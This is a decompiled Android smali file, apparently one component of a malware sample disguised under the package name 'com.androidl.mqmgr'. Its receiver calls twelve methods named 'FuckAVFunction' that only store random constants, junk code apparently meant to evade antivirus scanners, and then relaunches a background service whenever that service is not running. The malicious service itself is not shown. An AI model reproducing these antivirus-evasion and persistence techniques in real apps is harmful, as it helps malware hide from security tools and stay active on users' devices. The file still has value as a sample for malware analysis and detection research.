.class public Lcom/androidl/mqmgr/CbjtK;
.super Landroid/content/BroadcastReceiver;
.source "CbjtK.java"


# static fields
.field public static final ACTION:Ljava/lang/String; = "com.androidl.mqmgr.MainServiceStart"

.field private static p0:Ljava/lang/Boolean;

.field private static p1:Ljava/lang/Boolean;

.field private static p10:Ljava/lang/Boolean;

.field private static p11:Ljava/lang/String;

.field private static p12:Ljava/lang/Integer;

.field private static p2:Ljava/lang/String;

.field private static p3:Ljava/lang/Boolean;

.field private static p4:Ljava/lang/Integer;

.field private static p5:Ljava/lang/Integer;

.field private static p6:Ljava/lang/Boolean;

.field private static p7:Ljava/lang/String;

.field private static p8:Ljava/lang/Boolean;

.field private static p9:Ljava/lang/Integer;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 7
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private static FuckAVFunction0(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;)Ljava/lang/String;
    .locals 5
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/Boolean;
    .param p3, "v3"    # Ljava/lang/Boolean;
    .param p4, "v4"    # Ljava/lang/String;

    .prologue
    .line 28
    move-object v4, p4

    .line 29
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androidl/mqmgr/CbjtK;->p7:Ljava/lang/String;

    .line 30
    move-object v1, p1

    .line 31
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androidl/mqmgr/CbjtK;->p1:Ljava/lang/Boolean;

    .line 32
    move-object v2, p2

    .line 33
    .local v2, "s2":Ljava/lang/Boolean;
    sput-object v2, Lcom/androidl/mqmgr/CbjtK;->p8:Ljava/lang/Boolean;

    .line 34
    move-object v0, p0

    .line 35
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androidl/mqmgr/CbjtK;->p12:Ljava/lang/Integer;

    .line 36
    move-object v3, p3

    .line 37
    .local v3, "s3":Ljava/lang/Boolean;
    sput-object v3, Lcom/androidl/mqmgr/CbjtK;->p0:Ljava/lang/Boolean;

    .line 38
    return-object v4
.end method

.method private static FuckAVFunction1(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 6
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Boolean;
    .param p4, "v4"    # Ljava/lang/Boolean;
    .param p5, "v5"    # Ljava/lang/Boolean;

    .prologue
    .line 41
    move-object v0, p0

    .line 42
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androidl/mqmgr/CbjtK;->p5:Ljava/lang/Integer;

    .line 43
    move-object v3, p3

    .line 44
    .local v3, "s3":Ljava/lang/Boolean;
    sput-object v3, Lcom/androidl/mqmgr/CbjtK;->p1:Ljava/lang/Boolean;

    .line 45
    move-object v1, p1

    .line 46
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androidl/mqmgr/CbjtK;->p12:Ljava/lang/Integer;

    .line 47
    move-object v5, p5

    .line 48
    .local v5, "s5":Ljava/lang/Boolean;
    sput-object v5, Lcom/androidl/mqmgr/CbjtK;->p10:Ljava/lang/Boolean;

    .line 49
    move-object v2, p2

    .line 50
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androidl/mqmgr/CbjtK;->p11:Ljava/lang/String;

    .line 51
    move-object v4, p4

    .line 52
    .local v4, "s4":Ljava/lang/Boolean;
    sput-object v4, Lcom/androidl/mqmgr/CbjtK;->p8:Ljava/lang/Boolean;

    .line 53
    return-object v5
.end method

.method private static FuckAVFunction10(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;)V
    .locals 6
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/Integer;
    .param p3, "v3"    # Ljava/lang/Integer;
    .param p4, "v4"    # Ljava/lang/Integer;
    .param p5, "v5"    # Ljava/lang/String;

    .prologue
    .line 144
    move-object v3, p3

    .line 145
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androidl/mqmgr/CbjtK;->p9:Ljava/lang/Integer;

    .line 146
    move-object v0, p0

    .line 147
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androidl/mqmgr/CbjtK;->p3:Ljava/lang/Boolean;

    .line 148
    move-object v1, p1

    .line 149
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androidl/mqmgr/CbjtK;->p1:Ljava/lang/Boolean;

    .line 150
    move-object v4, p4

    .line 151
    .local v4, "s4":Ljava/lang/Integer;
    sput-object v4, Lcom/androidl/mqmgr/CbjtK;->p4:Ljava/lang/Integer;

    .line 152
    move-object v5, p5

    .line 153
    .local v5, "s5":Ljava/lang/String;
    sput-object v5, Lcom/androidl/mqmgr/CbjtK;->p2:Ljava/lang/String;

    .line 154
    move-object v2, p2

    .line 155
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androidl/mqmgr/CbjtK;->p12:Ljava/lang/Integer;

    .line 157
    return-void
.end method

.method private static FuckAVFunction11(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/String;

    .prologue
    .line 159
    move-object v2, p2

    .line 160
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androidl/mqmgr/CbjtK;->p7:Ljava/lang/String;

    .line 161
    move-object v1, p1

    .line 162
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androidl/mqmgr/CbjtK;->p0:Ljava/lang/Boolean;

    .line 163
    move-object v0, p0

    .line 164
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androidl/mqmgr/CbjtK;->p4:Ljava/lang/Integer;

    .line 165
    return-object v2
.end method

.method private static FuckAVFunction2(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)V
    .locals 4
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/Integer;
    .param p3, "v3"    # Ljava/lang/Integer;

    .prologue
    .line 56
    move-object v1, p1

    .line 57
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androidl/mqmgr/CbjtK;->p7:Ljava/lang/String;

    .line 58
    move-object v3, p3

    .line 59
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androidl/mqmgr/CbjtK;->p4:Ljava/lang/Integer;

    .line 60
    move-object v2, p2

    .line 61
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androidl/mqmgr/CbjtK;->p12:Ljava/lang/Integer;

    .line 62
    move-object v0, p0

    .line 63
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androidl/mqmgr/CbjtK;->p3:Ljava/lang/Boolean;

    .line 65
    return-void
.end method

.method private static FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;)V
    .locals 4
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/Boolean;
    .param p3, "v3"    # Ljava/lang/Integer;

    .prologue
    .line 67
    move-object v2, p2

    .line 68
    .local v2, "s2":Ljava/lang/Boolean;
    sput-object v2, Lcom/androidl/mqmgr/CbjtK;->p0:Ljava/lang/Boolean;

    .line 69
    move-object v1, p1

    .line 70
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androidl/mqmgr/CbjtK;->p11:Ljava/lang/String;

    .line 71
    move-object v0, p0

    .line 72
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androidl/mqmgr/CbjtK;->p4:Ljava/lang/Integer;

    .line 73
    move-object v3, p3

    .line 74
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androidl/mqmgr/CbjtK;->p5:Ljava/lang/Integer;

    .line 76
    return-void
.end method

.method private static FuckAVFunction4(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;)V
    .locals 3
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/Integer;

    .prologue
    .line 78
    move-object v0, p0

    .line 79
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androidl/mqmgr/CbjtK;->p6:Ljava/lang/Boolean;

    .line 80
    move-object v1, p1

    .line 81
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androidl/mqmgr/CbjtK;->p10:Ljava/lang/Boolean;

    .line 82
    move-object v2, p2

    .line 83
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androidl/mqmgr/CbjtK;->p4:Ljava/lang/Integer;

    .line 85
    return-void
.end method

.method private static FuckAVFunction5(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 3
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/Boolean;

    .prologue
    .line 87
    move-object v2, p2

    .line 88
    .local v2, "s2":Ljava/lang/Boolean;
    sput-object v2, Lcom/androidl/mqmgr/CbjtK;->p8:Ljava/lang/Boolean;

    .line 89
    move-object v0, p0

    .line 90
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androidl/mqmgr/CbjtK;->p0:Ljava/lang/Boolean;

    .line 91
    move-object v1, p1

    .line 92
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androidl/mqmgr/CbjtK;->p9:Ljava/lang/Integer;

    .line 93
    return-object v2
.end method

.method private static FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 6
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/Integer;
    .param p5, "v5"    # Ljava/lang/Boolean;

    .prologue
    .line 96
    move-object v3, p3

    .line 97
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androidl/mqmgr/CbjtK;->p2:Ljava/lang/String;

    .line 98
    move-object v0, p0

    .line 99
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androidl/mqmgr/CbjtK;->p1:Ljava/lang/Boolean;

    .line 100
    move-object v4, p4

    .line 101
    .local v4, "s4":Ljava/lang/Integer;
    sput-object v4, Lcom/androidl/mqmgr/CbjtK;->p9:Ljava/lang/Integer;

    .line 102
    move-object v1, p1

    .line 103
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androidl/mqmgr/CbjtK;->p4:Ljava/lang/Integer;

    .line 104
    move-object v5, p5

    .line 105
    .local v5, "s5":Ljava/lang/Boolean;
    sput-object v5, Lcom/androidl/mqmgr/CbjtK;->p3:Ljava/lang/Boolean;

    .line 106
    move-object v2, p2

    .line 107
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androidl/mqmgr/CbjtK;->p7:Ljava/lang/String;

    .line 108
    return-object v5
.end method

.method private static FuckAVFunction7(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;)V
    .locals 5
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Boolean;
    .param p4, "v4"    # Ljava/lang/Boolean;

    .prologue
    .line 111
    move-object v3, p3

    .line 112
    .local v3, "s3":Ljava/lang/Boolean;
    sput-object v3, Lcom/androidl/mqmgr/CbjtK;->p8:Ljava/lang/Boolean;

    .line 113
    move-object v4, p4

    .line 114
    .local v4, "s4":Ljava/lang/Boolean;
    sput-object v4, Lcom/androidl/mqmgr/CbjtK;->p3:Ljava/lang/Boolean;

    .line 115
    move-object v2, p2

    .line 116
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androidl/mqmgr/CbjtK;->p2:Ljava/lang/String;

    .line 117
    move-object v0, p0

    .line 118
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androidl/mqmgr/CbjtK;->p7:Ljava/lang/String;

    .line 119
    move-object v1, p1

    .line 120
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androidl/mqmgr/CbjtK;->p9:Ljava/lang/Integer;

    .line 122
    return-void
.end method

.method private static FuckAVFunction8(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 4
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Boolean;

    .prologue
    .line 124
    move-object v1, p1

    .line 125
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androidl/mqmgr/CbjtK;->p5:Ljava/lang/Integer;

    .line 126
    move-object v2, p2

    .line 127
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androidl/mqmgr/CbjtK;->p11:Ljava/lang/String;

    .line 128
    move-object v0, p0

    .line 129
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androidl/mqmgr/CbjtK;->p7:Ljava/lang/String;

    .line 130
    move-object v3, p3

    .line 131
    .local v3, "s3":Ljava/lang/Boolean;
    sput-object v3, Lcom/androidl/mqmgr/CbjtK;->p1:Ljava/lang/Boolean;

    .line 132
    return-object v3
.end method

.method private static FuckAVFunction9(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 3
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/Boolean;

    .prologue
    .line 135
    move-object v2, p2

    .line 136
    .local v2, "s2":Ljava/lang/Boolean;
    sput-object v2, Lcom/androidl/mqmgr/CbjtK;->p3:Ljava/lang/Boolean;

    .line 137
    move-object v0, p0

    .line 138
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androidl/mqmgr/CbjtK;->p7:Ljava/lang/String;

    .line 139
    move-object v1, p1

    .line 140
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androidl/mqmgr/CbjtK;->p12:Ljava/lang/Integer;

    .line 141
    return-object v2
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 9
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v8, 0x1

    const/4 v7, 0x0

    .line 170
    const v0, 0xa61a7ab

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "KOtUr"

    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x274fec76

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/CbjtK;->FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;)V

    .line 171
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x12bbf341

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/CbjtK;->FuckAVFunction4(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;)V

    .line 172
    const-string v0, "hQWQIQAr"

    const v1, 0x5a60433

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/CbjtK;->FuckAVFunction9(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 173
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "ndSKEQMM"

    const v2, 0x1f928e02

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0x2198534

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/CbjtK;->FuckAVFunction2(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)V

    .line 174
    sget-boolean v0, Lcom/androidl/mqmgr/DLaoRacV;->isRunning:Z

    if-nez v0, :cond_0

    .line 175
    const v0, 0x2fdf4dc5

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "GEnfhK"

    invoke-static {v0, v1, v2, v3, v4}, Lcom/androidl/mqmgr/CbjtK;->FuckAVFunction0(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;)Ljava/lang/String;

    .line 176
    const v0, 0x3a25cc50

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0x23efaa3b

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "VDVgsRBogg"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/CbjtK;->FuckAVFunction1(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 177
    new-instance v6, Landroid/content/Intent;

    const-string v0, "com.androidl.mqmgr.MainServiceStart"

    invoke-direct {v6, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 178
    .local v6, "i":Landroid/content/Intent;
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x236f9c01

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0x189e5973

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const v4, 0x2864fd48

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "InQfS"

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/CbjtK;->FuckAVFunction10(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;)V

    .line 179
    const-class v0, Lcom/androidl/mqmgr/DLaoRacV;

    invoke-virtual {v6, p1, v0}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 180
    const-string v0, "tOrGE"

    const v1, 0x32493aea

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "jlCpfp"

    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/CbjtK;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 181
    const-string v0, "vbOQU"

    const v1, 0x36cb2094

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/CbjtK;->FuckAVFunction9(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 182
    invoke-virtual {p1, v6}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 183
    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v7}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0xf0cfedb

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0x33c08ca4

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const v4, 0x148c35ba

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "iDTTcw"

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/CbjtK;->FuckAVFunction10(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;)V

    .line 184
    const v0, 0x1ebcd17d    # 1.9991917E-20f

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "WlbUAKI"

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/CbjtK;->FuckAVFunction11(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;)Ljava/lang/String;

    .line 186
    .end local v6    # "i":Landroid/content/Intent;
    :cond_0
    return-void
.end method
